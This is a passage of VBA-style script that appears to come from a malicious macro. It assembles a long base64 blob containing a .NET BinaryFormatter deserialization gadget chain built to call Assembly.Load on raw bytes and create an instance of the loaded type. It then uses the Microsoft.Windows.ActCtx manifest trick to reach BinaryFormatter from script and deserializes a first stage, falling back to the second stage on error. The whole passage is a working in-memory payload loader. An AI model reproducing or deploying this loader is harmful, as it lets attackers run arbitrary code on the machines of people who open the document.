stage_2 = stage_2 & "DwAAAAYtAAAA5gJTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5D"
stage_2 = stage_2 & "b2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBD"
stage_2 = stage_2 & "dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"
stage_2 = stage_2 & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlR5cGUsIG1zY29ybGli"
stage_2 = stage_2 & "LCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAki"
stage_2 = stage_2 & "AAAAEBYAAAAHAAAACQYAAAAJMAAAAAkxAAAACggIAAAAAAoICAEAAAABFwAAAA8AAAAGMgAAAO8BU3lzdGVtLkxpbnEuRW51bWVy"
stage_2 = stage_2 & "YWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"
stage_2 = stage_2 & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3Js"
stage_2 = stage_2 & "aWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAA"
stage_2 = stage_2 & "CSIAAAAQGAAAAAcAAAAJBwAAAAoJNQAAAAoICAAAAAAKCAgBAAAAARkAAAAPAAAABjYAAAApU3lzdGVtLldlYi5VSS5XZWJDb250"
stage_2 = stage_2 & "cm9scy5QYWdlZERhdGFTb3VyY2UEAAAABjcAAABNU3lzdGVtLldlYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWws"
stage_2 = stage_2 & "IFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EQGgAAAAcAAAAJCAAAAAgIAAAAAAgICgAAAAgBAAgBAAgBAAgIAAAAAAEb"
stage_2 = stage_2 & "AAAADwAAAAY5AAAAKVN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24uRGVzaWduZXJWZXJiBAAAAAY6AAAASVN5c3RlbSwgVmVy"
stage_2 = stage_2 & "c2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQHAAAAAUAAAANAgk7"
stage_2 = stage_2 & "AAAACAgDAAAACQsAAAABHQAAAA8AAAAGPQAAADRTeXN0ZW0uUnVudGltZS5SZW1vdGluZy5DaGFubmVscy5BZ2dyZWdhdGVEaWN0"
stage_2 = stage_2 & "aW9uYXJ5BAAAAAY+AAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49"
stage_2 = stage_2 & "Yjc3YTVjNTYxOTM0ZTA4ORAeAAAAAQAAAAkJAAAAEB8AAAACAAAACQoAAAAJCgAAABAgAAAAAgAAAAZBAAAAAAlBAAAABCQAAAAi"
stage_2 = stage_2 & "U3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgIAAAAIRGVsZWdhdGUHbWV0aG9kMAMDMFN5c3RlbS5EZWxlZ2F0ZVNl"
stage_2 = stage_2 & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhv"
stage_2 = stage_2 & "bGRlcglCAAAACUMAAAABKAAAACQAAAAJRAAAAAlFAAAAASwAAAAkAAAACUYAAAAJRwAAAAEwAAAAJAAAAAlIAAAACUkAAAABMQAA"
stage_2 = stage_2 & "ACQAAAAJSgAAAAlLAAAAATUAAAAkAAAACUwAAAAJTQAAAAE7AAAABAAAAAlOAAAACU8AAAAEQgAAADBTeXN0ZW0uRGVsZWdhdGVT"
stage_2 = stage_2 & "ZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJs"
stage_2 = stage_2 & "eQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRp"
stage_2 = stage_2 & "b25Ib2xkZXIrRGVsZWdhdGVFbnRyeQZQAAAA1QFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lv"
stage_2 = stage_2 & "bj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVj"
stage_2 = stage_2 & "dGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1i"
stage_2 = stage_2 & "NzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZSAAAAGlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5BlMAAAAETG9hZAoEQwAA"
stage_2 = stage_2 & "AC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xh"
stage_2 = stage_2 & "c3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBl"
stage_2 = stage_2 & "W10JUwAAAAk+AAAACVIAAAAGVgAAACdTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkGVwAAAC5TeXN0ZW0u"
stage_2 = stage_2 & "UmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10pCAAAAAoBRAAAAEIAAAAGWAAAAMwCU3lzdGVtLkZ1bmNgMltb"
stage_2 = stage_2 & "U3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVi"
stage_2 = stage_2 & "bGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5"
stage_2 = stage_2 & "c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1"
stage_2 = stage_2 & "YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1i"
stage_2 = stage_2 & "NzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAlSAAAABlsAAAAIR2V0VHlwZXMKAUUAAABDAAAACVsAAAAJPgAAAAlSAAAABl4A"
stage_2 = stage_2 & "AAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpBl8AAAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpCAAAAAoBRgAAAEIAAAAGYAAA"
stage_2 = stage_2 & "ALYDU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1z"
stage_2 = stage_2 & "Y29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1d"
stage_2 = stage_2 & "LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUw"
stage_2 = stage_2 & "ODldLFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNp"
stage_2 = stage_2 & "b249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBW"
stage_2 = stage_2 & "ZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4A"
stage_2 = stage_2 & "AAAGYgAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBW"
stage_2 = stage_2 & "ZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBmMAAAANR2V0"
stage_2 = stage_2 & "RW51bWVyYXRvcgoBRwAAAEMAAAAJYwAAAAk+AAAACWIAAAAGZgAAAEVTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVy"
stage_2 = stage_2 & "YXRvcmAxW1N5c3RlbS5UeXBlXSBHZXRFbnVtZXJhdG9yKCkGZwAAAJQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1l"
stage_2 = stage_2 & "cmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5"
stage_2 = stage_2 & "VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dIEdldEVudW1lcmF0b3IoKQgAAAAKAUgAAABCAAAABmgAAADAAlN5c3RlbS5GdW5jYDJb"
stage_2 = stage_2 & "W1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00"
stage_2 = stage_2 & "LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNp"
stage_2 = stage_2 & "b249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkJvb2xl"
stage_2 = stage_2 & "YW4sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0"
stage_2 = stage_2 & "ZTA4OV1dCT4AAAAKCT4AAAAGagAAAB5TeXN0ZW0uQ29sbGVjdGlvbnMuSUVudW1lcmF0b3IGawAAAAhNb3ZlTmV4dAoBSQAAAEMA"
stage_2 = stage_2 & "AAAJawAAAAk+AAAACWoAAAAGbgAAABJCb29sZWFuIE1vdmVOZXh0KCkGbwAAABlTeXN0ZW0uQm9vbGVhbiBNb3ZlTmV4dCgpCAAA"
stage_2 = stage_2 & "AAoBSgAAAEIAAAAGcAAAAL0CU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtb"
stage_2 = stage_2 & "U3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3"
stage_2 = stage_2 & "YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2Vu"
stage_2 = stage_2 & "PWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFs"
stage_2 = stage_2 & "LCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZyAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2Vu"
stage_2 = stage_2 & "ZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFs"
stage_2 = stage_2 & "LCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GcwAAAAtnZXRfQ3VycmVudAoBSwAAAEMAAAAJcwAAAAk+AAAACXIA"
stage_2 = stage_2 & "AAAGdgAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpBncAAAAZU3lzdGVtLlR5cGUgZ2V0X0N1cnJlbnQoKQgAAAAKAUwAAABC"
stage_2 = stage_2 & "AAAABngAAADGAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5l"
stage_2 = stage_2 & "dXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00"
stage_2 = stage_2 & "LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnoAAAAQ"
stage_2 = stage_2 & "U3lzdGVtLkFjdGl2YXRvcgZ7AAAADkNyZWF0ZUluc3RhbmNlCgFNAAAAQwAAAAl7AAAACT4AAAAJegAAAAZ+AAAAKVN5c3RlbS5P"
stage_2 = stage_2 & "YmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpBn8AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0u"
stage_2 = stage_2 & "VHlwZSkIAAAACgFOAAAADwAAAAaAAAAAJlN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24uQ29tbWFuZElEBAAAAAk6AAAAEE8A"
stage_2 = stage_2 & "AAACAAAACYIAAAAICAAgAAAEggAAAAtTeXN0ZW0uR3VpZAsAAAACX2ECX2ICX2MCX2QCX2UCX2YCX2cCX2gCX2kCX2oCX2sAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAgHBwICAgICAgICExPSdO4q0RGL+wCgyQ8m9wsL"


    Dim stm_1 As Object, fmt_1 As Object
    
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"


    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
    actCtx.ManifestText = manifest
        
    Set stm_1 = actCtx.CreateObject("System.IO.MemoryStream")
    Set fmt_1 = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")

    Dim Decstage_1
    Decstage_1 = b64Decode(stage_1)

    For Each i In Decstage_1
        stm_1.WriteByte i
    Next i

    On Error Resume Next

    stm_1.Position = 0
    Dim o1 As Object
    Set o1 = fmt_1.Deserialize_2(stm_1)

    If Err.Number <> 0 Then
       Dim stm_2 As Object
       
       Set stm_2 = actCtx.CreateObject("System.IO.MemoryStream")

       Dim Decstage_2
       Decstage_2 = b64Decode(stage_2)

       For Each j In Decstage_2
        stm_2.WriteByte j
       Next j

       stm_2.Position = 0
       Dim o2 As Object
       Set o2 = fmt_1.Deserialize_2(stm_2)
    End If

End Function